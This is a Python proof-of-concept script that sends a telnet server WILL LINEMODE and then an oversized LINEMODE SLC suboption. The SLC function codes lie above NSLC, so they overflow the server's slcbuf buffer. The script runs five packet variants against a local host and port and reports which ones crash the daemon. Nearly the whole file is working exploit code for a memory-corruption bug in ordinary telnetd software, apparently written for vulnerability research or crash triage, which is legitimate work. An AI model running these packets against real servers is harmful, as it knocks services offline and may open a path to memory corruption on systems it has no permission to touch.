#!/usr/bin/env python3
"""
Test crash scenarios: WILL LINEMODE + SLC overflow sent in the same packet.

Tries several variants to see which combinations crash the server vs survive.
"""

import socket
import time
import sys

HOST = "127.0.0.1"
PORT = 2325

# Telnet protocol constants
IAC  = 0xFF
DONT = 0xFE
DO   = 0xFD
WONT = 0xFC
WILL = 0xFB
SB   = 0xFA
SE   = 0xF0

OPT_TTYPE       = 0x18
OPT_NAWS        = 0x1F
OPT_TSPEED      = 0x20
OPT_LINEMODE    = 0x22
OPT_XDISPLOC    = 0x23
OPT_OLD_ENVIRON = 0x24
OPT_NEW_ENVIRON = 0x27

LM_SLC = 0x03
NSLC   = 18  # 0x12


def build_slc_suboption(num_triplets):
    """Build IAC SB LINEMODE SLC <triplets> IAC SE with num_triplets triplets.

    For func > NSLC, server writes (func, SLC_NOSUPPORT=0, 0) to slcbuf.
    When func == 0xFF, we need IAC doubling: [IAC, IAC, 0x02, 0x00].
    """
    payload = bytes([IAC, SB, OPT_LINEMODE, LM_SLC])
    for i in range(num_triplets):
        # Use function values starting from NSLC+1 (19) upward
        # to ensure server writes them as overflow
        func = NSLC + 1 + i
        if func == IAC:
            # IAC doubling required
            payload += bytes([IAC, IAC, 0x02, 0x00])
        elif func > 0xFF:
            # Wrap around, use values starting from NSLC+1 again
            func = NSLC + 1 + (i % (0xFF - NSLC - 1))
            if func == IAC:
                payload += bytes([IAC, IAC, 0x02, 0x00])
            else:
                payload += bytes([func, 0x02, 0x00])
        else:
            payload += bytes([func, 0x02, 0x00])
    payload += bytes([IAC, SE])
    return payload


def build_will(opt):
    return bytes([IAC, WILL, opt])


def try_variant(name, packet_data, timeout=3):
    """Connect, receive initial DOs, send packet_data, check if crashed."""
    print(f"\n{'='*60}")
    print(f"Variant: {name}")
    print(f"Packet size: {len(packet_data)} bytes")
    print(f"{'='*60}")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((HOST, PORT))
    except Exception as e:
        print(f"  [!] Connection failed: {e}")
        return "connect_failed"

    # Receive initial DOs from server
    try:
        initial = sock.recv(4096)
        print(f"  [*] Received {len(initial)} bytes of initial negotiation")
    except socket.timeout:
        print(f"  [!] Timeout receiving initial data")
        sock.close()
        return "timeout_initial"

    # Small delay to let server settle
    time.sleep(0.2)

    # Send our combined packet
    try:
        sock.sendall(packet_data)
        print(f"  [*] Sent {len(packet_data)} byte payload")
    except Exception as e:
        print(f"  [!] Send failed: {e}")
        sock.close()
        return "send_failed"

    # Wait a moment for server to process
    time.sleep(0.5)

    # Check if connection is still alive
    status = "unknown"

    # Try to receive data (server may send SLC response or other negotiation)
    try:
        resp = sock.recv(4096)
        if resp:
            print(f"  [*] Received {len(resp)} bytes response (connection ALIVE)")
            status = "alive"
        else:
            print(f"  [*] recv() returned empty - connection closed by server (CRASHED?)")
            status = "crashed"
    except socket.timeout:
        print(f"  [*] recv() timed out - connection may be alive (no response data)")
        # Try sending something to verify
        try:
            sock.sendall(b"\r\n")
            time.sleep(0.3)
            resp2 = sock.recv(4096)
            if resp2:
                print(f"  [*] Follow-up recv got {len(resp2)} bytes (ALIVE)")
                status = "alive"
            else:
                print(f"  [*] Follow-up recv empty (CRASHED?)")
                status = "crashed"
        except (BrokenPipeError, ConnectionResetError, OSError) as e:
            print(f"  [*] Follow-up send/recv failed: {e} (CRASHED)")
            status = "crashed"
        except socket.timeout:
            print(f"  [*] Follow-up also timed out - assuming alive but unresponsive")
            status = "alive_unresponsive"
    except (BrokenPipeError, ConnectionResetError, OSError) as e:
        print(f"  [*] recv() error: {e} (CRASHED)")
        status = "crashed"

    # Final check: try to send data
    if status == "alive":
        try:
            sock.sendall(bytes([IAC, WILL, OPT_TTYPE]))
            time.sleep(0.3)
            resp3 = sock.recv(4096)
            print(f"  [*] Final check: got {len(resp3)} bytes (confirmed ALIVE)")
        except Exception as e:
            print(f"  [*] Final check failed: {e} (actually CRASHED)")
            status = "crashed"

    sock.close()
    print(f"  >>> RESULT: {status}")

    # Give server time to restart if it crashed
    time.sleep(1)
    return status


def main():
    print("=" * 60)
    print("TELNETD CRASH TEST: WILL LINEMODE + SLC overflow in same packet")
    print(f"Target: {HOST}:{PORT}")
    print("=" * 60)

    results = {}

    # --- Variant 1: WILL LINEMODE + SLC with 80 triplets ---
    pkt = build_will(OPT_LINEMODE) + build_slc_suboption(80)
    results["v1_80triplets"] = try_variant(
        "WILL LINEMODE + SLC 80 triplets (single packet)", pkt)

    # --- Variant 2: WILL LINEMODE + SLC with 40 triplets ---
    pkt = build_will(OPT_LINEMODE) + build_slc_suboption(40)
    results["v2_40triplets"] = try_variant(
        "WILL LINEMODE + SLC 40 triplets (single packet)", pkt)

    # --- Variant 3: WILL LINEMODE + SLC with 120 triplets ---
    pkt = build_will(OPT_LINEMODE) + build_slc_suboption(120)
    results["v3_120triplets"] = try_variant(
        "WILL LINEMODE + SLC 120 triplets (single packet)", pkt)

    # --- Variant 4: WILLs for multiple options + WILL LINEMODE + SLC 80 ---
    pkt = (build_will(OPT_TTYPE) +
           build_will(OPT_NAWS) +
           build_will(OPT_TSPEED) +
           build_will(OPT_XDISPLOC) +
           build_will(OPT_NEW_ENVIRON) +
           build_will(OPT_OLD_ENVIRON) +
           build_will(OPT_LINEMODE) +
           build_slc_suboption(80))
    results["v4_multi_will_80triplets"] = try_variant(
        "WILLs for all options + WILL LINEMODE + SLC 80 triplets", pkt)

    # --- Variant 5: WILLs for everything EXCEPT TTYPE + SLC overflow ---
    # This might trigger the defer path differently since TTYPE is often
    # the option that triggers terminal init
    pkt = (build_will(OPT_NAWS) +
           build_will(OPT_TSPEED) +
           build_will(OPT_XDISPLOC) +
           build_will(OPT_NEW_ENVIRON) +
           build_will(OPT_OLD_ENVIRON) +
           build_will(OPT_LINEMODE) +
           build_slc_suboption(80))
    results["v5_no_ttype_80triplets"] = try_variant(
        "WILLs (no TTYPE) + WILL LINEMODE + SLC 80 triplets", pkt)

    # --- Summary ---
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    for variant, status in results.items():
        indicator = "CRASH" if "crash" in status else "ALIVE" if "alive" in status else status.upper()
        print(f"  {variant:40s} -> {indicator} ({status})")

    # Count crashes
    crashes = sum(1 for s in results.values() if "crash" in s)
    alive = sum(1 for s in results.values() if "alive" in s)
    print(f"\nTotal: {crashes} crashed, {alive} alive, "
          f"{len(results) - crashes - alive} other")


if __name__ == "__main__":
    main()
